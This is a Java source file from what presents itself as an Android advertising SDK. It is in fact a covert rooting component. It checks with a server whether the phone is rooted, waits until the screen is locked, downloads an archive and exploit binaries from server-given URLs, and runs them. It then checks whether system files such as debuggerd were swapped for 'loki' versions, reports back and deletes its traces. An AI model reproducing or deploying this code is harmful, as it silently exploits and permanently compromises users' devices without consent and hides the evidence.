package com.parker.adsdk.work;

import android.app.AlarmManager;
import android.app.KeyguardManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.StatFs;
import android.preference.PreferenceManager;

import com.parker.adsdk.RootHelper;
import com.parker.adsdk.entity.WorkPlan;
import com.parker.adsdk.network.NetworkRequest;
import com.parker.adsdk.network.RequestUtil;
import com.parker.adsdk.util.FileUtils;
import com.parker.adsdk.util.MyLog;
import com.parker.adsdk.util.PreferenceUtils;
import com.parker.adsdk.util.ServiceUtils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.UUID;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

/**
 * Created by thinkpad on 2016/8/9.
 */
public class Work {
    private Context context;
    private File otaName;
    private File work;
    private String otaUrl;
    private File otaDir;
    private long extra_start_time;
    private long extra_end_time;
    private String extra_trigger;
    private int exe_time;

    public Work(Context context) {
        super();
        this.context = context;
        this.exe_time = 0;
    }

    public Work(Context context, long extra_start_time, long extra_end_time, String extra_trigger) {
        this.context = context;
        this.extra_start_time = extra_start_time;
        this.extra_end_time = extra_end_time;
        this.extra_trigger = extra_trigger;
        this.exe_time = 1;
    }

    public void run() {
        MyLog.i("正在检测R状态...");
        String resp = RequestUtil.requestInit(this.context ,false);
        try {
            JSONObject jsonObject = new JSONObject(resp);
            if (jsonObject.optJSONObject("result").optInt("code") != 0) {
                MyLog.i("停止R，错误代码：" + jsonObject.optJSONObject("result").optInt("code"));
                this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish"));
                return;
            }

            if (ServiceUtils.isRoot(this.context, jsonObject)) {
                this.context.sendBroadcast(new Intent("org.admobile.helper.intent.r.status").putExtra(
                        "status", true));
                MyLog.i("已R, 停止流程");
                this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish"));
            } else {
                MyLog.i("未R");
                this.trigger();
            }

            return;
        } catch (Exception e) {
            return;
        }
    }

    private void trigger() {
        if (this.exe_time == 0) {
            MyLog.i("执行类型：立即执行");
            this.exec();
        } else {
            MyLog.i("执行类型：定时执行");
            MyLog.i("定时执行触发条件：" + this.extra_trigger);
            if (this.extra_trigger.equals("lock")) {
                if (((KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE)).inKeyguardRestrictedInputMode()) {
                    MyLog.i("已锁屏，开始执行");
                    this.exec();
                    return;
                }

                MyLog.i("未锁屏，延后１小时执行");
                this.extra_start_time += 3600000;
                if (this.extra_start_time > this.extra_end_time) {
                    MyLog.i("已超过最晚时间，放弃R");
                    return;
                }

                AlarmManager alarmManager = (AlarmManager) this.context.getSystemService(Context.ALARM_SERVICE);
                Intent intent = new Intent("com.admonet.helper.timing.work.start");
                intent.putExtra("extra_start_time", this.extra_start_time);
                intent.putExtra("extra_end_time", this.extra_end_time);
                intent.putExtra("extra_trigger", this.extra_trigger);
                PendingIntent pendingIntent = PendingIntent.getBroadcast(this.context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
                alarmManager.cancel(pendingIntent);
                alarmManager.set(0, this.extra_start_time, pendingIntent);
                MyLog.i("时间设置为:" + this.extra_start_time);
                return;
            }

            this.exec();
        }

    }

    private void exec() {
        MyLog.i("正在获取数据...");
        String resp = RequestUtil.requestOta(this.context);
        ArrayList<WorkPlan> plans = new ArrayList();
        plans.addAll(this.getStoredPlans());
        plans.addAll(this.parseNewPlan(resp));
        this.storeAllPlans(plans);
        FileInputStream fis = null;
        try {
            MyLog.i("获取OTA数据...");
            RequestUtil.downloadFile(this.context, RequestUtil.EVENT_HELPER_DOWNLOAD_OTA, this.otaUrl, this.otaName, this.getOtaMd5(resp));
            fis = new FileInputStream(this.otaName);
            MyLog.i("正在解析数据...");
            try {
                this.extracto(fis, this.otaDir);
            } catch (Exception e) {
                RequestUtil.recordLog(this.context, 24, null);
                throw e;
            }
            int i = 1;
            for (WorkPlan workPlan : plans) {
                if (workPlan.getState() == 1) {
                    workPlan.setState(0);
                } else if (workPlan.getState() != 0) {

                    MyLog.i("方案" + i + ":" + workPlan.getUrl().substring(
                            workPlan.getUrl().lastIndexOf("/") + 1, workPlan.getUrl().length())
                            + " " + workPlan.getParams() + " " + this.otaName.getAbsolutePath());
                    workPlan.setState(1);
                    this.storeAllPlans(plans);
                    MyLog.i("正在获取方案数据...");
                    RequestUtil.downloadFile(this.context, RequestUtil.EVENT_HELPER_DOWNLOAD_PLAN, workPlan.getUrl(), this.work, workPlan.getPlanMd5());
                    try {
                        if (this.execWorkPlan(workPlan)) {
                            this.removeAllPlans();
                            this.clear();
                            return;
                        }
                        workPlan.setState(0);
                        this.storeAllPlans(plans);
                        i++;
                    } catch (Throwable tr) {
                        workPlan.setState(0);
                        this.storeAllPlans(plans);
                        i++;
                    }
                } else {
                    continue;
                }


            }
        } catch (Exception ex) {
            MyLog.i("出现错误，R失败" + ex.getMessage());
            this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish"));
            this.clear();
            return;

        } finally {
            if (fis != null) {
                try {
                    fis.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private void putLastTid(String tid) {
        PreferenceManager.getDefaultSharedPreferences(this.context).edit().putString("lastTid", tid)
                .apply();
    }

    private boolean execWorkPlan(WorkPlan workPlan) throws JSONException, IOException {
        String tid = UUID.randomUUID().toString();
        this.putLastTid(tid);
        boolean result = false;
        MyLog.i("方案获取成功，开始执行方案...");
        JSONObject plan = new JSONObject();
        plan.put("url", workPlan.getUrl());
        plan.put("params", workPlan.getParams());
        RequestUtil.recordWork(this.context, tid, 1, plan, null);
        try {
            String line;
            Process process = Runtime.getRuntime().exec(this.buildCmd(workPlan.getParams()));
            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
            do {
                line = br.readLine();
                if (line != null) {
                    MyLog.i(line);
                    if (line.equals("[exp_result]:[success]")) {
                        break;
                    }
                } else {
                    break;
                }
            } while (!line.equals("[exp_result]:[failure]"));
            this.removeLastTid();
            String str = line.equals("[exp_result]:[success]") ? "R成功，请重启手机" : "R失败";
            MyLog.i(str);
            boolean sucess = line.equals("[exp_result]:[success]");
            if (sucess) {
                try {
                    long systemFreeSpace = this.getSystemFreeSpace();
                    JSONObject info = new JSONObject();
                    info.put("systemFreeSpace", systemFreeSpace);
                    File fDebuggerd = new File("/system/bin/debuggerd");
                    File fDebuggerd_loki = new File("/system/bin/debuggerd_loki");
                    File fLokisdkJar = new File("/data/system/.loki/lokisdk.jar");
                    if ((fDebuggerd.exists()) && (fDebuggerd_loki.exists()) && fDebuggerd.length() != fDebuggerd_loki
                            .length()) {
                        RequestUtil.recordWork(this.context, tid, 61, plan, info);
                        PreferenceUtils.putDoneTrue(this.context);
                        this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish").putExtra(
                                "need_reboot", true));
                        result = sucess;
                    } else {
                        if (fLokisdkJar.exists()) {
                            info.put("debuggerdFileSize", fDebuggerd.length());
                            RequestUtil.recordWork(this.context, tid, 63, plan, info);
                        } else {
                            RequestUtil.recordWork(this.context, tid, 62, plan, null);
                        }
                        PreferenceUtils.putDoneTrue(this.context);
                        this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish").putExtra(
                                "need_reboot", true));
                        result = sucess;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }


            } else {
                result = sucess;

            }
            br.close();
            process.destroy();
            return result;


        } catch (Exception ex) {
            RequestUtil.recordWork(context, tid, 3, plan, null);
            return false;
        }

    }

    private void removeLastTid() {
        PreferenceManager.getDefaultSharedPreferences(this.context).edit().remove("lastTid").apply();
    }

    private long getSystemFreeSpace() {
        StatFs starFs = new StatFs("/system");
        return (((long) starFs.getBlockCount())) * (((long) starFs.getBlockSize()));
    }

    private String buildCmd(String params) {
        return this.work.getAbsolutePath() + " " + params + " " + this.otaDir.getAbsolutePath();
    }

    private void clear() {
        MyLog.i("清理文件...");
        this.work.delete();
        this.otaDir.delete();
        File[] files = this.context.getFilesDir().listFiles();
        int len = files.length;
        int i;
        for (i = 0; i < len; ++i) {
            files[i].delete();
        }
    }

    private void removeAllPlans() {
        MyLog.i("删除所有方案...");
        PreferenceManager.getDefaultSharedPreferences(this.context).edit().remove("plans").apply();
    }

    private void extracto(InputStream is, File destdir) throws IOException {
        destdir.mkdirs();
        FileUtils.setPermissions(destdir, 511);
        ZipInputStream zis = new ZipInputStream(is);
        File f;
        while (true) {
            ZipEntry zipEntry = zis.getNextEntry();
            if (zipEntry == null) {
                break;
            }

            String name = zipEntry.getName();
            if (name.startsWith("META-INF")) {
                continue;
            }

            if (zipEntry.isDirectory()) {
                continue;
            }

            if (!"package".equals(name) && !"version".equals(name) && !"installer".equals(name)) {
                continue;
            }

            f = new File(destdir, name);
            f.delete();
            FileOutputStream fos = new FileOutputStream(f);
            this.copyFile(zis, fos);
            fos.close();
            FileUtils.setPermissions(f, 511);
        }

        zis.close();
/*        File v0_1 = new File(destdir, "installer");
        f = new File(destdir, "installer");
        if(!v0_1.equals(f)) {
            v0_1.renameTo(f);
        }*/
    }

    private void copyFile(InputStream in, OutputStream out) throws IOException {
        byte[] buf = new byte[4096];
        while (true) {
            int len = in.read(buf);
            if (len <= 0) {
                return;
            }

            out.write(buf, 0, len);
        }
    }

    private String getOtaMd5(String jsonStr) {
        String result;
        try {
            result = new JSONObject(jsonStr).optString("otaMd5");
        } catch (Exception e) {
            result = "";
        }

        return result;
    }


    private void storeAllPlans(List<WorkPlan> plans) {
        MyLog.i("存储所有方案...");
        JSONArray jsonArray = new JSONArray();
        Iterator<WorkPlan> it = plans.iterator();
        while (it.hasNext()) {
            jsonArray.put(it.next().pack());
        }

        PreferenceManager.getDefaultSharedPreferences(this.context).edit().putString("plans", jsonArray.toString())
                .apply();
    }

    private List<WorkPlan> getStoredPlans() {
        MyLog.i("获取已存储方案...");
        ArrayList<WorkPlan> result = new ArrayList();
        String str = PreferenceManager.getDefaultSharedPreferences(this.context).getString("plans", null);
        try {
            JSONArray workPlans = new JSONArray(str);
            for (int i = 0; i < workPlans.length(); ++i) {
                result.add(new WorkPlan(workPlans.optJSONObject(i)));
            }
        } catch (Exception e) {
        }

        Iterator<WorkPlan> it = result.iterator();
        while (it.hasNext()) {
            WorkPlan workPlan = it.next();
            if (workPlan.getState() != 1) {
                continue;
            }

            workPlan.setState(0);
        }

        return result;
    }

    private List<WorkPlan> parseNewPlan(String str) {
        MyLog.i("解析新方案...");
        ArrayList<WorkPlan> result = new ArrayList();
        try {
            JSONObject jsonObject = new JSONObject(str);
            String otaName = jsonObject.optString("otaName", "");
            JSONArray plan = jsonObject.optJSONArray("plan");
            for (int i = 0; i < plan.length(); ++i) {
                result.add(new WorkPlan(plan.optJSONObject(i)));
            }

            this.otaUrl = jsonObject.optString("otaUrl");
            this.otaDir = this.context.getDir("ota", 3);
            this.otaDir.mkdir();
            this.otaName = new File(this.context.getFilesDir(), otaName);
            this.work = new File(this.context.getFilesDir(), "work");

        } catch (Exception e) {
        }
        return result;
    }


}
